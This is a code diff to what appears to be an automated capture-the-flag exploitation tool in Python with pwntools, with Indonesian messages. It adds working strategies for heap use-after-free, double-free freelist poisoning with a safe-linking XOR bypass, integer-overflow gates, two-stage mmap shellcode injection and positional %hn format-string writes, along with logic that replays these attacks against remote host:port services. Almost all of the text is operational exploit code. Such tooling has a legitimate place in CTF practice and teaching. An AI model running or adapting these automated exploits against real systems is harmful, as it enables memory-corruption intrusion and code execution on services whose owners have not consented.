@@ -981,6 +981,11 @@ int openat(int dirfd, const char *path, int flags, ...) {
         generic = [
             "menu_file_read_traversal",
             "menu_handoff_shellcode",
+            "two_stage_mmap_shellcode",
+            "hidden_arg_format_write",
+            "integer_logic_gate",
+            "menu_uaf_patterns",
+            "custom_freelist_menu",
             "bounded_admin_padding",
             "generic_symbol_ret2win",
             "callme_sequence",
@@ -1084,6 +1089,60 @@ int openat(int dirfd, const char *path, int flags, ...) {
             matches = re.findall(r"lea\s+rax,\[rbp-0x([0-9a-fA-F]+)\]", block)
             if matches:
                 return int(matches[-1], 16) + ptr_size
+        return None
+
+    def primary_disassembly(self) -> str:
+        for name in ("vuln", "main"):
+            if name in self.target.elf.symbols:
+                disasm = self.disassemble_function(name)
+                if f"<{name}>" in disasm:
+                    return disasm
+        return run_cmd(["objdump", "-d", "-M", "intel", str(self.target.binary)], cwd=self.target.cwd, timeout=8)
+
+    def parse_stack_read_to_compare_offset(self, value: int) -> int | None:
+        disasm = self.primary_disassembly()
+        read_buf_off: int | None = None
+        lines = disasm.splitlines()
+        for idx, line in enumerate(lines):
+            if "<read" not in line:
+                continue
+            block = "\n".join(lines[max(0, idx - 10) : idx])
+            matches = re.findall(r"lea\s+rax,\[rbp-0x([0-9a-fA-F]+)\]", block)
+            if matches:
+                read_buf_off = int(matches[-1], 16)
+        if read_buf_off is None:
+            return None
+        marker = f"0x{value:x}"
+        for line in lines:
+            match = re.search(r"cmp\s+(?:DWORD|QWORD|WORD|BYTE)\s+PTR\s+\[rbp-0x([0-9a-fA-F]+)\],\s*" + re.escape(marker), line)
+            if match:
+                cmp_off = int(match.group(1), 16)
+                if read_buf_off > cmp_off:
+                    return read_buf_off - cmp_off
+        return None
+
+    def parse_stack_read_to_funcptr_offset(self) -> int | None:
+        disasm = self.primary_disassembly()
+        lines = disasm.splitlines()
+        read_buf_off: int | None = None
+        for idx, line in enumerate(lines):
+            if "<read" not in line:
+                continue
+            block = "\n".join(lines[max(0, idx - 10) : idx])
+            matches = re.findall(r"lea\s+rax,\[rbp-0x([0-9a-fA-F]+)\]", block)
+            if matches:
+                read_buf_off = int(matches[-1], 16)
+        if read_buf_off is None:
+            return None
+        for idx, line in enumerate(lines):
+            if not re.search(r"call\s+r(?:a|b|c|d)x|call\s+rdx|call\s+rax", line):
+                continue
+            block = "\n".join(lines[max(0, idx - 8) : idx + 1])
+            matches = re.findall(r"mov\s+r(?:a|b|c|d)x,QWORD PTR \[rbp-0x([0-9a-fA-F]+)\]", block)
+            if matches:
+                ptr_off = int(matches[-1], 16)
+                if read_buf_off > ptr_off:
+                    return read_buf_off - ptr_off
         return None
 
     def exploit_strcpy_overflow(self) -> ExploitResult:
@@ -1295,6 +1354,162 @@ int openat(int dirfd, const char *path, int flags, ...) {
     def exploit_tcache_poison_menu(self) -> ExploitResult:
         return self.tcache_poison_common(b"6 call\n", "target_hook", "1", "2", "3", "6", None)
 
+    def menu_line(self, tube, value: int | str, timeout: float = 0.22) -> bytes:
+        tube.send(str(value).encode() + b"\n")
+        return self.drain_available(tube, timeout=timeout, idle=0.03)
+
+    def menu_raw(self, tube, payload: bytes, timeout: float = 0.22) -> bytes:
+        tube.send(payload)
+        return self.drain_available(tube, timeout=timeout, idle=0.03)
+
+    def run_menu_uaf_attack(self, tube, strategy: str) -> ExploitResult:
+        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
+        symbols = self.target.elf.symbols
+        if not re.search(r"free|reuse|dangling|vtable|delete", hay, re.I):
+            raise RuntimeError("pola menu UAF tidak cocok")
+
+        output = self.drain_available(tube, timeout=0.35, idle=0.03)
+        notes: list[str] = []
+        if "target" in symbols and re.search(r"writer|check|target=", hay, re.I):
+            target = int(symbols["target"])
+            magic = 0x1337133713371337
+            output += self.menu_line(tube, 1)
+            output += self.menu_line(tube, 2)
+            output += self.menu_line(tube, 3)
+            output += self.menu_raw(tube, b"A" * 16 + p64(target) + p64(magic))
+            output += self.menu_line(tube, 4)
+            output += self.menu_line(tube, 5)
+            vuln = "Use-after-free writer reuses a freed object as an arbitrary 8-byte write primitive"
+            notes.extend([f"target={hex(target)}", f"magic={hex(magic)}"])
+        elif "real_vtable" in symbols and "win" in symbols:
+            win = int(symbols["win"])
+            output += self.menu_line(tube, 1, timeout=0.35)
+            match = re.search(rb"0x[0-9a-fA-F]+", output)
+            if not match:
+                raise RuntimeError("leak object heap tidak ditemukan")
+            obj = int(match.group(0), 16)
+            output += self.menu_line(tube, 2)
+            output += self.menu_line(tube, 3)
+            output += self.menu_raw(tube, p64(obj + 8) + p64(win) + b"A" * 24)
+            output += self.menu_line(tube, 4)
+            vuln = "Use-after-free object reuse installs an in-chunk fake vtable from the runtime heap leak"
+            notes.extend([f"object={hex(obj)}", f"fake_vtable={hex(obj + 8)}", f"win={hex(win)}"])
+        elif "win" in symbols:
+            win = int(symbols["win"])
+            output += self.menu_line(tube, 1)
+            output += self.menu_raw(tube, b"SilverPWN\n")
+            output += self.menu_line(tube, 2)
+            output += self.menu_line(tube, 3)
+            output += self.menu_raw(tube, p64(win) + b"A" * 24)
+            output += self.menu_line(tube, 4)
+            vuln = "Use-after-free callback object is reallocated and its function pointer is replaced"
+            notes.append(f"win={hex(win)}")
+        else:
+            raise RuntimeError("symbol target/real_vtable/win untuk UAF tidak ditemukan")
+
+        output += self.drain_available(tube, timeout=1.0, idle=0.04)
+        flag = extract_flag(output, self.args.flag)
+        return ExploitResult(
+            strategy=strategy,
+            success=flag is not None,
+            confidence=88 if flag else 35,
+            output=output,
+            flag=flag,
+            payload=b"<interactive menu payload>",
+            vuln=vuln,
+            notes=notes,
+        )
+
+    def exploit_menu_uaf_patterns(self) -> ExploitResult:
+        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
+        if not re.search(r"1\.(?:new|create).*2\.(?:free|delete).*3\.(?:reuse|note)", hay, re.I | re.S):
+            raise RuntimeError("menu UAF 1/2/3 tidak cocok")
+        p = self.start()
+        try:
+            return self.run_menu_uaf_attack(p, "Menu UAF pattern")
+        finally:
+            try:
+                p.close()
+            except Exception:
+                pass
+
+    def run_custom_freelist_attack(self, tube, strategy: str) -> ExploitResult:
+        symbols = self.target.elf.symbols
+        if "free_head" not in symbols or "slots" not in symbols:
+            raise RuntimeError("custom freelist symbols tidak ditemukan")
+        if "win" not in symbols:
+            raise RuntimeError("symbol win tidak ditemukan")
+
+        output = self.drain_available(tube, timeout=0.35, idle=0.03)
+        win = int(symbols["win"])
+        hook = int(symbols.get("hook", 0))
+        notes = [f"win={hex(win)}"]
+
+        if not hook:
+            output += self.menu_line(tube, 1)
+            output += self.menu_line(tube, 0)
+            output += self.menu_line(tube, 3)
+            output += self.menu_line(tube, 0)
+            output += self.menu_raw(tube, p64(win))
+            output += self.menu_line(tube, 4)
+            output += self.menu_line(tube, 0)
+            vuln = "Custom allocator object can be edited and called as a function pointer"
+        else:
+            for choice, idx in ((1, 0), (1, 1), (2, 0), (2, 1), (2, 0)):
+                output += self.menu_line(tube, choice)
+                output += self.menu_line(tube, idx)
+
+            encoded_target = hook
+            if "secret" in symbols:
+                output += self.menu_line(tube, 4)
+                output += self.menu_line(tube, 0)
+                match = re.search(rb"secret_hint=(0x[0-9a-fA-F]+)", output)
+                if not match:
+                    raise RuntimeError("secret safe-linking tidak bocor")
+                secret = int(match.group(1), 16)
+                encoded_target = hook ^ secret
+                notes.append(f"secret={hex(secret)}")
+
+            output += self.menu_line(tube, 3)
+            output += self.menu_line(tube, 0)
+            output += self.menu_raw(tube, p64(encoded_target))
+            output += self.menu_line(tube, 1)
+            output += self.menu_line(tube, 2)
+            output += self.menu_line(tube, 1)
+            output += self.menu_line(tube, 3)
+            output += self.menu_line(tube, 3)
+            output += self.menu_line(tube, 3)
+            output += self.menu_raw(tube, p64(win))
+            output += self.menu_line(tube, 5 if "secret" in symbols else 4)
+            vuln = "Double-free custom freelist poisoning returns an allocation overlapping the global hook"
+            notes.extend([f"hook={hex(hook)}", f"encoded_target={hex(encoded_target)}"])
+
+        output += self.drain_available(tube, timeout=1.0, idle=0.04)
+        flag = extract_flag(output, self.args.flag)
+        return ExploitResult(
+            strategy=strategy,
+            success=flag is not None,
+            confidence=90 if flag else 35,
+            output=output,
+            flag=flag,
+            payload=b"<interactive menu payload>",
+            vuln=vuln,
+            notes=notes,
+        )
+
+    def exploit_custom_freelist_menu(self) -> ExploitResult:
+        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
+        if not ("free_head" in self.target.elf.symbols and "slots" in self.target.elf.symbols and re.search(r"alloc.*free.*edit", hay, re.I | re.S)):
+            raise RuntimeError("pola custom freelist menu tidak cocok")
+        p = self.start()
+        try:
+            return self.run_custom_freelist_attack(p, "Custom freelist menu")
+        finally:
+            try:
+                p.close()
+            except Exception:
+                pass
+
     def exploit_integer_overflow_read(self) -> ExploitResult:
         p, _init, win = self.win_from_initial(b"length:\n")
         offset = self.parse_stack_read_saved_rip_offset() or 88
@@ -1314,6 +1529,69 @@ int openat(int dirfd, const char *path, int flags, ...) {
         raw = 256
         payload = f"{raw}\n".encode() + b"A" * offset + p64(win)
         return self.finalize(p, payload, "Length truncation overflow", 88, "8-bit tiny length passes while raw length overflows", offset, [f"raw length={raw}"])
+
+    def run_prompted_payload_once(self, payload: bytes, timeout: float = 2.0) -> bytes:
+        p = self.start()
+        banner = self.recv_until_any_prompt(p, [b": ", b"> ", b"? ", b"\n"], timeout=0.5)
+        p.send(payload)
+        try:
+            p.shutdown("send")
+        except Exception:
+            pass
+        try:
+            out = self.drain_available(p, timeout=timeout)
+        finally:
+            try:
+                p.close()
+            except Exception:
+                pass
+        return banner + out
+
+    def exploit_integer_logic_gate(self) -> ExploitResult:
+        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
+        if "__isoc99_scanf" not in self.target.elf.plt and "__isoc99_scanf" not in self.target.elf.got:
+            raise RuntimeError("integer gate membutuhkan scanf")
+        if not re.search(r"integer|underflow|qty:|copy_len|need=|budget|len", hay, re.I):
+            raise RuntimeError("pola integer gate tidak cocok")
+
+        marker_offset = self.parse_stack_read_to_compare_offset(0x41424344) or 0x20
+        funcptr_offset = self.parse_stack_read_to_funcptr_offset() or 0x40
+        candidates: list[tuple[str, bytes, int | None]] = [
+            ("32-bit multiplication wrap", b"42949673\n", None),
+            ("Unsigned subtract length underflow", b"0\n" + b"A" * marker_offset + b"DCBA", marker_offset),
+        ]
+        win = int(self.target.elf.symbols.get("win", 0))
+        if win:
+            for raw in (b"-8\n", b"4294967288\n"):
+                candidates.append((f"Validator add overflow to function pointer ({raw.strip().decode()})", raw + b"A" * funcptr_offset + p64(win), funcptr_offset))
+
+        tried: list[str] = []
+        for name, payload, offset in candidates:
+            tried.append(name)
+            out = self.run_prompted_payload_once(payload, timeout=2.5)
+            flag = extract_flag(out, self.args.flag)
+            if flag:
+                notes = [f"attempt={name}", f"attempts={len(tried)}"]
+                if win:
+                    notes.append(f"win={hex(win)}")
+                return ExploitResult(
+                    strategy="Integer logic gate",
+                    success=True,
+                    confidence=84,
+                    output=out,
+                    flag=flag,
+                    payload=payload,
+                    vuln="Integer wrap/underflow makes a guarded arithmetic check accept an unsafe value",
+                    offset=offset,
+                    notes=notes,
+                )
+        return ExploitResult(
+            strategy="Integer logic gate",
+            success=False,
+            confidence=25,
+            vuln="Integer wrap/underflow guarded path",
+            notes=[f"attempts={len(tried)}", f"marker_offset={marker_offset}", f"funcptr_offset={funcptr_offset}"],
+        )
 
     def exploit_pie_leak_ret2win(self) -> ExploitResult:
         p = self.start()
@@ -1597,6 +1875,73 @@ int openat(int dirfd, const char *path, int flags, ...) {
         result = self.finalize(p, sc, "RWX mmap shellcode", 92, "Program calls attacker-controlled RWX mmap buffer", None, [f"rwx={hex(leaks.get('rwx', 0))}", f"shellcode_len={len(sc)}"])
         return result
 
+    def first_hex_leak(self, data: bytes) -> int | None:
+        match = re.search(rb"0x[0-9a-fA-F]+", data)
+        if not match:
+            return None
+        try:
+            return int(match.group(0), 16)
+        except ValueError:
+            return None
+
+    def parse_xor_key(self, data: bytes) -> int | None:
+        match = re.search(rb"(?:xor[-_ ]?key|key)\s*=\s*(?:0x)?([0-9a-fA-F]{1,2})", data, re.I)
+        if not match:
+            return None
+        return int(match.group(1), 16)
+
+    def run_two_stage_mmap_shellcode_attack(self, tube, strategy: str) -> ExploitResult:
+        if self.target.elf.bits != 64:
+            raise RuntimeError("two-stage mmap shellcode target harus amd64")
+        output = self.recv_until_any_prompt(
+            tube,
+            [b"send shellcode: ", b"encoded shellcode: ", b"shellcode: "],
+            timeout=1.2,
+        )
+        stage = self.first_hex_leak(output)
+        if not stage:
+            raise RuntimeError("leak alamat stage mmap tidak ditemukan")
+        sc = self.flag_shellcode()
+        key = self.parse_xor_key(output)
+        stage_payload = bytes((byte ^ key) for byte in sc) if key is not None else sc
+        tube.send(stage_payload)
+        output += self.recv_until_any_prompt(tube, [b"overflow: "], timeout=1.0)
+        offset = self.parse_stack_read_saved_rip_offset() or 72
+        tube.send(b"A" * offset + p64(stage))
+        try:
+            tube.shutdown("send")
+        except Exception:
+            pass
+        out = self.drain_available(tube, timeout=2.5)
+        flag = extract_flag(output + out, self.args.flag)
+        notes = [f"stage={hex(stage)}", f"shellcode_len={len(sc)}"]
+        if key is not None:
+            notes.append(f"xor_key=0x{key:02x}")
+        return ExploitResult(
+            strategy=strategy,
+            success=flag is not None,
+            confidence=90 if flag else 35,
+            output=output + out,
+            flag=flag,
+            payload=b"<two-stage mmap shellcode>",
+            vuln="RWX mmap shellcode staged first; later stack overflow returns to the leaked stage pointer",
+            offset=offset,
+            notes=notes,
+        )
+
+    def exploit_two_stage_mmap_shellcode(self) -> ExploitResult:
+        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
+        if not ("stage" in self.target.elf.symbols and re.search(r"shellcode", hay, re.I) and re.search(r"overflow", hay, re.I)):
+            raise RuntimeError("pola two-stage mmap shellcode tidak cocok")
+        p = self.start()
+        try:
+            return self.run_two_stage_mmap_shellcode_attack(p, "Two-stage mmap shellcode")
+        finally:
+            try:
+                p.close()
+            except Exception:
+                pass
+
     def memory_scan_shellcode(self) -> bytes:
         context.clear(arch="amd64", os="linux")
         context.log_level = "error"
@@ -1713,6 +2058,71 @@ int openat(int dirfd, const char *path, int flags, ...) {
                 return prefix + b"A" * pad + addr_blob
             arg = new_arg
         raise RuntimeError("fmt halfword payload tidak stabil")
+
+    def fmt_hidden_arg_halfwords_payload(self, writes: list[tuple[int, int]]) -> bytes:
+        values = [value & 0xFFFF for _, value in writes]
+        order = sorted(range(len(writes)), key=lambda idx: values[idx])
+        printed = 0
+        parts: list[str] = []
+        for idx in order:
+            arg_index, _raw_value = writes[idx]
+            value = values[idx]
+            inc = (value - printed) & 0xFFFF
+            if inc:
+                parts.append(f"%{inc}c")
+                printed = (printed + inc) & 0xFFFF
+            parts.append(f"%{arg_index}$hn")
+        return "".join(parts).encode() + b"\n"
+
+    def exploit_hidden_arg_format_write(self) -> ExploitResult:
+        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
+        symbols = self.target.elf.symbols
+        if "printf" not in self.target.elf.plt and "printf" not in self.target.elf.got:
+            raise RuntimeError("printf tidak ditemukan")
+        if not re.search(r"fmt|format|auth=|target=|hook", hay, re.I):
+            raise RuntimeError("pola format string hidden-arg tidak cocok")
+
+        notes: list[str] = []
+        if "auth" in symbols:
+            writes = [(2, 0x1337)]
+            notes.append("auth=0x1337 via arg2")
+        elif "target" in symbols:
+            writes = [(2, 0xBEEF), (3, 0xDEAD)]
+            notes.append("target=0xdeadbeef via arg2/arg3")
+        elif "hook" in symbols and "win" in symbols:
+            win = int(symbols["win"])
+            writes = [(2, win & 0xFFFF), (3, (win >> 16) & 0xFFFF)]
+            notes.append(f"hook={hex(int(symbols['hook']))}")
+            notes.append(f"win={hex(win)}")
+        else:
+            raise RuntimeError("symbol auth/target/hook+win tidak ditemukan")
+
+        payload = self.fmt_hidden_arg_halfwords_payload(writes)
+        p = self.start()
+        init = self.recv_until_any_prompt(p, [b"name: ", b"fmt: ", b"format: ", b": "], timeout=1.0)
+        p.send(payload)
+        try:
+            p.shutdown("send")
+        except Exception:
+            pass
+        try:
+            out = self.drain_available(p, timeout=2.0)
+        finally:
+            try:
+                p.close()
+            except Exception:
+                pass
+        flag = extract_flag(init + out, self.args.flag)
+        return ExploitResult(
+            strategy="Hidden-arg format write",
+            success=flag is not None,
+            confidence=88 if flag else 35,
+            output=init + out,
+            flag=flag,
+            payload=payload,
+            vuln="Format string receives target pointers as hidden printf arguments and writes halfwords with positional %hn",
+            notes=notes + [f"payload_len={len(payload)}"],
+        )
 
     def exploit_format_leak(self) -> ExploitResult:
         p = self.start()
@@ -3596,19 +4006,77 @@ int openat(int dirfd, const char *path, int flags, ...) {
         if not host:
             local_result.notes.append("Remote spec tidak dikenali; gunakan host:port atau 'nc host port'.")
             return
+
+        def adopt_remote(remote_result: ExploitResult, success_note: str, failure_note: str) -> None:
+            if remote_result.flag:
+                local_result.flag = remote_result.flag
+                local_result.output = remote_result.output
+                local_result.success = True
+                local_result.notes.extend([success_note] + remote_result.notes)
+            else:
+                local_result.flag = None
+                local_result.output = remote_result.output
+                local_result.success = False
+                local_result.confidence = min(local_result.confidence, remote_result.confidence)
+                local_result.notes.extend([failure_note] + remote_result.notes)
+
+        def mark_remote_error(message: str) -> None:
+            local_result.flag = None
+            local_result.success = False
+            local_result.confidence = min(local_result.confidence, 25)
+            local_result.notes.append(message)
+
+        if local_result.strategy.startswith("Two-stage mmap shellcode"):
+            try:
+                with context.local(log_level="critical"):
+                    tube = remote(host, port, timeout=4)
+                    remote_result = self.run_two_stage_mmap_shellcode_attack(tube, "Remote two-stage mmap shellcode")
+                adopt_remote(
+                    remote_result,
+                    "Remote two-stage mmap shellcode dieksploit dengan leak stage runtime server.",
+                    "Remote two-stage mmap shellcode dicoba, tetapi flag tidak ditemukan.",
+                )
+            except Exception as exc:
+                mark_remote_error(f"Remote two-stage mmap shellcode attempt gagal: {exc}")
+            return
+        if local_result.strategy.startswith("Menu UAF pattern"):
+            try:
+                with context.local(log_level="critical"):
+                    tube = remote(host, port, timeout=4)
+                    remote_result = self.run_menu_uaf_attack(tube, "Remote menu UAF pattern")
+                adopt_remote(
+                    remote_result,
+                    "Remote menu UAF dieksploit ulang secara interaktif.",
+                    "Remote menu UAF dicoba, tetapi flag tidak ditemukan.",
+                )
+            except Exception as exc:
+                mark_remote_error(f"Remote menu UAF attempt gagal: {exc}")
+            return
+        if local_result.strategy.startswith("Custom freelist menu"):
+            try:
+                with context.local(log_level="critical"):
+                    tube = remote(host, port, timeout=4)
+                    remote_result = self.run_custom_freelist_attack(tube, "Remote custom freelist menu")
+                adopt_remote(
+                    remote_result,
+                    "Remote custom freelist menu dieksploit ulang secara interaktif.",
+                    "Remote custom freelist menu dicoba, tetapi flag tidak ditemukan.",
+                )
+            except Exception as exc:
+                mark_remote_error(f"Remote custom freelist attempt gagal: {exc}")
+            return
         if local_result.strategy.startswith("i386 start shellcode"):
             try:
                 with context.local(log_level="critical"):
                     tube = remote(host, port, timeout=4)
                     remote_result = self.run_i386_start_shellcode_attack(tube, "Remote i386 start shellcode leak")
-                if remote_result.flag:
-                    local_result.flag = remote_result.flag
-                    local_result.output = remote_result.output
-                    local_result.notes.extend(["Remote start-style shellcode dieksploit dengan leak runtime server."] + remote_result.notes)
-                else:
-                    local_result.notes.extend(["Remote start-style shellcode dicoba, tetapi flag tidak ditemukan."] + remote_result.notes)
+                adopt_remote(
+                    remote_result,
+                    "Remote start-style shellcode dieksploit dengan leak runtime server.",
+                    "Remote start-style shellcode dicoba, tetapi flag tidak ditemukan.",
+                )
             except Exception as exc:
-                local_result.notes.append(f"Remote start-style shellcode attempt gagal: {exc}")
+                mark_remote_error(f"Remote start-style shellcode attempt gagal: {exc}")
             return
         if local_result.strategy.startswith("i386 ORW shellcode"):
             remote_notes: list[str] = []
@@ -3620,26 +4088,27 @@ int openat(int dirfd, const char *path, int flags, ...) {
                     if remote_result.flag:
                         local_result.flag = remote_result.flag
                         local_result.output = remote_result.output
+                        local_result.success = True
                         local_result.notes.extend([f"Remote ORW shellcode berhasil dengan path {path}."] + remote_result.notes)
                         return
                     remote_notes.extend(remote_result.notes)
                 except Exception as exc:
                     remote_notes.append(f"{path}: {exc}")
-            local_result.notes.extend(["Remote ORW shellcode dicoba, tetapi flag tidak ditemukan."] + remote_notes[:6])
+            mark_remote_error("Remote ORW shellcode dicoba, tetapi flag tidak ditemukan.")
+            local_result.notes.extend(remote_notes[:6])
             return
         if self.target.template == "pico_echo_valley":
             try:
                 with context.local(log_level="critical"):
                     tube = remote(host, port, timeout=4)
                     remote_result = self.run_echo_valley_attack(tube, "Remote Pico Echo Valley fmt ret2win")
-                if remote_result.flag:
-                    local_result.flag = remote_result.flag
-                    local_result.output = remote_result.output
-                    local_result.notes.extend(["Remote Echo Valley dieksploit dengan leak runtime server."] + remote_result.notes)
-                else:
-                    local_result.notes.extend(["Remote Echo Valley dicoba, tetapi flag tidak ditemukan."] + remote_result.notes)
+                adopt_remote(
+                    remote_result,
+                    "Remote Echo Valley dieksploit dengan leak runtime server.",
+                    "Remote Echo Valley dicoba, tetapi flag tidak ditemukan.",
+                )
             except Exception as exc:
-                local_result.notes.append(f"Remote Echo Valley attempt gagal: {exc}")
+                mark_remote_error(f"Remote Echo Valley attempt gagal: {exc}")
             return
 
         def replayable(payload: bytes) -> bool:
@@ -3653,7 +4122,7 @@ int openat(int dirfd, const char *path, int flags, ...) {
                     local_result.notes.append(f"Menggunakan payload replayable dari attempt: {attempt.strategy}")
                     break
         if not replayable(remote_payload):
-            local_result.notes.append("Remote tidak di-hit otomatis karena tidak ada payload replayable.")
+            mark_remote_error("Remote tidak di-hit otomatis karena tidak ada payload replayable.")
             return
         try:
             with context.local(log_level="critical"):
@@ -3665,11 +4134,12 @@ int openat(int dirfd, const char *path, int flags, ...) {
             if flag:
                 local_result.flag = flag
                 local_result.output = out
+                local_result.success = True
                 local_result.notes.append("Remote hit sekali setelah validasi lokal berhasil dan flag ditemukan.")
             else:
-                local_result.notes.append("Remote hit sekali setelah validasi lokal, tetapi flag tidak ditemukan.")
+                mark_remote_error("Remote hit sekali setelah validasi lokal, tetapi flag tidak ditemukan.")
         except Exception as exc:
-            local_result.notes.append(f"Remote attempt gagal: {exc}")
+            mark_remote_error(f"Remote attempt gagal: {exc}")
 
     def parse_remote(self, spec: str) -> tuple[str | None, int]:
         spec = spec.strip()
